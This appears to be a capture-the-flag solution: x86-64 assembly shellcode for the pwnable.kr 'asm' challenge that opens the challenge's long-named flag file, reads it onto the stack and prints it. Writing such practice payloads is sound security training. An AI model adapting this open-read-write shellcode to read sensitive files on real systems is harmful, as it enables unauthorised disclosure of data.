.section .text
.globl _start
.equiv sys_read, 0
.equiv sys_write, 1
.equiv sys_open, 2
.equiv sys_exit, 60
.equiv buf_len, 64
_start:
	xorq %rdi, %rdi
	leaq .filename(%rip), %rdi
	movb $sys_open, %al
	syscall

	movzbq %al, %r10

	subq $64, %rsp

	movq %rsp, %r9
	subb $buf_len, %r9b
	movq %r9, %rsi
	movq %r10, %rdi
	movq $buf_len, %rdx
	movb $sys_read, %al
	syscall

	movq $1, %rdi
	movq %r9, %rsi
	movq $sys_write, %rax
	syscall
.filename:
	.asciz "this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong"
